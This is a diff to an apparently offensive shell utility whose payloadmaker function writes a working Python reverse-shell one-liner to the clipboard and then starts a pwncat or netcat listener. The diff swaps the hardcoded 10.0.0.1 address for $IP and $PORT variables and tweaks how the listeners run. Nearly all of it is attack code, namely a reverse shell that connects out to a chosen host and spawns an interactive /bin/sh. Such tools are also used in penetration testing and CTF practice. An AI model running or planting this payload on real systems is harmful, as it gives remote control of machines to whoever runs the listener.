@@ -32,7 +32,7 @@ function payloadmaker(){
 
 	#Generating Payload
 	if [ "$1" = "Python" ]; then
-		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipboard
+		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipboard
 		listener "$2"
 
 	elif [ "$1" = "Bash" ]; then
@@ -67,13 +67,11 @@ function listener(){
 		clear
 		echo -e "${green}Pwncat Listener Started."
 		echo -e "${yellow}pwncat-cs -lp $PORT"
-		pwncat=`source /opt/pwncat/pwncat-env/bin/activate;pwncat-cs -lp $PORT` 
-	
+		pwncat=`cd /opt/pwncat;source pwncat-env/bin/activate;pwncat-cs -lp $PORT`
+		echo $pwncat	
 	elif [ $1 == "Netcat" ]; then
-		clear
-		echo -e "${green}Netcat Listener Started."
-		echo -e "${yellow}nc -lvnp $PORT"
 		netcat=`nc -lvnp $PORT` 
+		echo $netcat
 	fi
 }
 
